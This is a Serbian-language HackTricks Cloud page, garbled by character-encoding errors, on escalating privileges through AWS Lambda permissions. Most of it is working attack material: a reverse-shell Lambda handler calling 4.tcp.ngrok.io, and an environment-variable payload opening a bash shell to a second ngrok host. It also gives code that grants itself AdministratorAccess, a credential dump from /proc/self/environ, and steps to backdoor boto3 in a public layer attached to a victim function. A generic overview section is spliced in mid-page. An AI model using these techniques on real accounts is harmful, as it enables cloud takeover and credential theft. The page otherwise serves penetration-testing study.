# AWS - Lambda Privesc

{% hint style="success" %}
NauÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
NauÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## lambda

ViÅ¡e informacija o lambda u:

{% content-ref url="../aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Korisnici sa **`iam:PassRole`, `lambda:CreateFunction`, i `lambda:InvokeFunction`** dozvolama mogu eskalirati svoje privilegije.\
Mogu **kreirati novu Lambda funkciju i dodeliti joj postojeÄ‡u IAM ulogu**, dajuÄ‡i funkciji dozvole povezane sa tom ulogom. Korisnik zatim moÅ¾e **pisati i otpremiti kod u ovu Lambda funkciju (na primer sa rev shell)**.\
Kada je funkcija postavljena, korisnik moÅ¾e **pokrenuti njeno izvrÅ¡avanje** i Å¾eljene akcije pozivanjem Lambda funkcije putem AWS API-ja. Ovaj pristup efektivno omoguÄ‡ava korisniku da obavlja zadatke indirektno putem Lambda funkcije, radeÄ‡i sa nivoom pristupa koji je dodeljen IAM ulozi povezanoj sa njom.\\

NapadaÄ bi mogao zloupotrebiti ovo da dobije **rev shell i ukrade token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}

# AWS Lambda Privilege Escalation

## Uvod

AWS Lambda je serverless raÄunska usluga koja omoguÄ‡ava korisnicima da pokreÄ‡u kod bez upravljanja serverima. Iako je vrlo korisna, moÅ¾e biti meta za napadaÄe koji traÅ¾e naÄine za eskalaciju privilegija unutar AWS okruÅ¾enja.

## Tehnike eskalacije privilegija

### 1. Lambda Execution Role Privilege Escalation

Lambda funkcije koriste IAM uloge za pristup AWS resursima. Ako napadaÄ moÅ¾e da modifikuje ili kreira novu Lambda funkciju sa viÅ¡im privilegijama, moÅ¾e eskalirati svoje privilegije.

#### Koraci:

1. Identifikujte Lambda funkciju sa visokom privilegijom.
2. Modifikujte kod funkcije ili kreirajte novu funkciju sa istom ulogom.
3. Pokrenite funkciju da biste dobili pristup resursima.

### 2. Environment Variable Leak

Lambda funkcije Äesto koriste promenljive okruÅ¾enja za Äuvanje konfiguracionih podataka. Ako napadaÄ moÅ¾e da pristupi ovim promenljivim, moÅ¾e dobiti osetljive informacije kao Å¡to su API kljuÄevi ili lozinke.

#### Koraci:

1. Pristupite Lambda funkciji.
2. Ispitajte promenljive okruÅ¾enja za osetljive informacije.
3. Iskoristite dobijene informacije za dalju eskalaciju.

### 3. Lambda Function Code Injection

Ako napadaÄ moÅ¾e da ubrizga zlonamerni kod u Lambda funkciju, moÅ¾e preuzeti kontrolu nad funkcijom i koristiti je za eskalaciju privilegija.

#### Koraci:

1. PronaÄ‘ite ranjivu Lambda funkciju.
2. Ubrizgajte zlonamerni kod.
3. Pokrenite funkciju da biste izvrÅ¡ili zlonamerni kod.

## ZakljuÄak

AWS Lambda moÅ¾e biti moÄ‡an alat za napadaÄe koji traÅ¾e naÄine za eskalaciju privilegija. Razumevanje ovih tehnika moÅ¾e pomoÄ‡i u zaÅ¡titi vaÅ¡eg AWS okruÅ¾enja.
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
MoÅ¾ete takoÄ‘e **zloupotrebiti dozvole lambda uloge** iz same lambda funkcije.\
Ako lambda uloga ima dovoljno dozvola, moÅ¾ete je koristiti da sebi dodelite administratorska prava:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
TakoÄ‘e je moguÄ‡e otkriti kredencijale lambda role bez potrebe za eksternom vezom. Ovo bi bilo korisno za **Network isolated Lambdas** koje se koriste za interne zadatke. Ako postoje nepoznate sigurnosne grupe koje filtriraju vaÅ¡e reverse shell-ove, ovaj deo koda Ä‡e vam omoguÄ‡iti da direktno otkrijete kredencijale kao izlaz lambde.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potencijalni uticaj:** Direktan privesc na proizvoljnu lambda servisnu ulogu koja je navedena.

{% hint style="danger" %}
Napomena da Äak i ako izgleda interesantno **`lambda:InvokeAsync`** **ne** omoguÄ‡ava samostalno **izvrÅ¡avanje `aws lambda invoke-async`**, takoÄ‘e vam je potrebna `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Kao u prethodnom scenariju, moÅ¾ete **dodeliti sebi dozvolu `lambda:InvokeFunction`** ako imate dozvolu **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potencijalni uticaj:** Direktan privesc na proizvoljnu lambda servisnu ulogu koja je navedena.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Korisnici sa **`iam:PassRole`, `lambda:CreateFunction`, i `lambda:CreateEventSourceMapping`** dozvolama (i potencijalno `dynamodb:PutItem` i `dynamodb:CreateTable`) mogu indirektno **eskalirati privilegije** Äak i bez `lambda:InvokeFunction`.\
Oni mogu kreirati **Lambda funkciju sa zlonamernim kodom i dodeliti joj postojeÄ‡u IAM ulogu**.

Umesto direktnog pozivanja Lambda funkcije, korisnik postavlja ili koristi postojeÄ‡u DynamoDB tabelu, povezujuÄ‡i je sa Lambda funkcijom putem mapiranja izvora dogaÄ‘aja. Ova postavka osigurava da se Lambda funkcija **automatski pokreÄ‡e prilikom unosa nove stavke** u tabelu, bilo akcijom korisnika ili nekim drugim procesom, Äime se indirektno poziva Lambda funkcija i izvrÅ¡ava kod sa dozvolama dodeljene IAM uloge.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Ako je DynamoDB veÄ‡ aktivan u AWS okruÅ¾enju, korisnik samo **treba da uspostavi mapiranje izvora dogaÄ‘aja** za Lambda funkciju. MeÄ‘utim, ako DynamoDB nije u upotrebi, korisnik mora **kreirati novu tabelu** sa omoguÄ‡enim strimovanjem:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Sada je moguÄ‡e **povezati Lambda funkciju sa DynamoDB tabelom** kreiranjem **mapiranja izvora dogaÄ‘aja**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Sa Lambda funkcijom povezanom sa DynamoDB stream-om, napadaÄ moÅ¾e **indirektno aktivirati Lambda funkciju aktiviranjem DynamoDB stream-a**. Ovo se moÅ¾e postiÄ‡i **ubacivanjem stavke** u DynamoDB tabelu:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potencijalni Uticaj:** Direktan privesc na lambda servisnu ulogu koja je navedena.

### `lambda:AddPermission`

NapadaÄ sa ovom dozvolom moÅ¾e **dodeliti sebi (ili drugima) bilo koje dozvole** (ovo generiÅ¡e politike zasnovane na resursima za dodelu pristupa resursu):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potencijalni uticaj:** Direktan privesc na lambda servisnu ulogu koriÅ¡Ä‡enu davanjem dozvole za modifikaciju koda i njegovo pokretanje.

### `lambda:AddLayerVersionPermission`

NapadaÄ sa ovom dozvolom moÅ¾e **dodeliti sebi (ili drugima) dozvolu `lambda:GetLayerVersion`**. Mogao bi pristupiti sloju i traÅ¾iti ranjivosti ili osetljive informacije

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Potencijalni uticaj:** Potencijalni pristup osetljivim informacijama.

### `lambda:UpdateFunctionCode`

Korisnici koji poseduju dozvolu **`lambda:UpdateFunctionCode`** imaju potencijal da **modifikuju kod postojeÄ‡e Lambda funkcije koja je povezana sa IAM ulogom.**\
NapadaÄ moÅ¾e **modifikovati kod lambda funkcije kako bi eksfiltrirao IAM kredencijale**.

Iako napadaÄ moÅ¾da nema direktnu moguÄ‡nost da pozove funkciju, ako Lambda funkcija veÄ‡ postoji i operativna je, verovatno je da Ä‡e biti pokrenuta kroz postojeÄ‡e tokove rada ili dogaÄ‘aje, Äime se indirektno omoguÄ‡ava izvrÅ¡enje modifikovanog koda.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potencijalni Uticaj:** Direktan privesc na lambda servisnu ulogu koja se koristi.

### `lambda:UpdateFunctionConfiguration`

#### RCE preko env varijabli

Sa ovim dozvolama moguÄ‡e je dodati promenljive okruÅ¾enja koje Ä‡e uzrokovati da Lambda izvrÅ¡i proizvoljan kod. Na primer, u python-u je moguÄ‡e zloupotrebiti promenljive okruÅ¾enja `PYTHONWARNING` i `BROWSER` da bi python proces izvrÅ¡io proizvoljne komande:

{% code overflow="wrap" %}
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
{% endcode %}

Za druge skript jezike postoje druge env varijable koje moÅ¾ete koristiti. Za viÅ¡e informacija pogledajte podsekcije skript jezika u:

{% embed url="https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse" %}

#### RCE preko Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) omoguÄ‡ava ukljuÄivanje **koda** u vaÅ¡u lambda funkciju, ali **skladiÅ¡tenje ga odvojeno**, tako da kod funkcije moÅ¾e ostati mali i **viÅ¡e funkcija moÅ¾e deliti kod**.

Unutar lambda moÅ¾ete proveriti putanje odakle se python kod uÄitava sa funkcijom kao Å¡to je sledeÄ‡a:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Ovo su mesta:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Na primer, biblioteka boto3 se uÄitava iz `/var/runtime/boto3` (4. pozicija).

#### Eksploatacija

MoguÄ‡e je zloupotrebiti dozvolu `lambda:UpdateFunctionConfiguration` da **dodate novi sloj** lambda funkciji. Da bi se izvrÅ¡io proizvoljan kod, ovaj sloj treba da sadrÅ¾i neku **biblioteku koju Ä‡e lambda importovati.** Ako moÅ¾ete da proÄitate kod lambde, lako Ä‡ete ovo pronaÄ‡i, takoÄ‘e imajte na umu da je moguÄ‡e da lambda **veÄ‡ koristi sloj** i da moÅ¾ete **preuzeti** sloj i **dodati svoj kod** tamo.

Na primer, pretpostavimo da lambda koristi biblioteku boto3, ovo Ä‡e kreirati lokalni sloj sa poslednjom verzijom biblioteke:
```bash
pip3 install -t ./lambda_layer boto3
```
MoÅ¾ete otvoriti `./lambda_layer/boto3/__init__.py` i **dodati backdoor u globalni kod** (na primer, funkciju za eksfiltraciju kredencijala ili dobijanje reverse shell-a).

Zatim, zip-ujte taj direktorijum `./lambda_layer` i **upload-ujte novi lambda layer** na vaÅ¡ nalog (ili na nalog Å¾rtve, ali moÅ¾da nemate dozvole za to).\
Napomena: potrebno je kreirati python folder i staviti biblioteke tamo kako biste zamenili /opt/python/boto3. TakoÄ‘e, layer mora biti **kompatibilan sa python verzijom** koju koristi lambda i ako ga upload-ujete na vaÅ¡ nalog, mora biti u **istoj regiji:**

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

Sada, uÄinite da je otpremljeni lambda sloj **dostupan bilo kom nalogu**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
I prikaÄi lambda sloj na Å¾rtvinu lambda funkciju:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
SledeÄ‡i korak bi bio da **pozovemo funkciju** sami ako moÅ¾emo ili da Äekamo da **bude pozvana** na normalan naÄin â€“ Å¡to je sigurnija metoda.

**Diskretniji naÄin za eksploataciju ove ranjivosti** moÅ¾e se naÄ‡i u:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potencijalni uticaj:** Direktan privesc na ulogu lambda servisa koja se koristi.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

MoÅ¾da sa tim dozvolama moÅ¾ete kreirati funkciju i izvrÅ¡iti je pozivom URL-a... ali nisam mogao pronaÄ‡i naÄin da to testiram, pa mi javite ako uspete!

### Lambda MitM

Neke lambde Ä‡e **primati osetljive informacije od korisnika u parametrima.** Ako dobijete RCE u jednoj od njih, moÅ¾ete eksfiltrirati informacije koje drugi korisnici Å¡alju, proverite to u:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Reference

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{% hint style="success" %}
NauÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
NauÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hakovanje trikove podnoÅ¡enjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
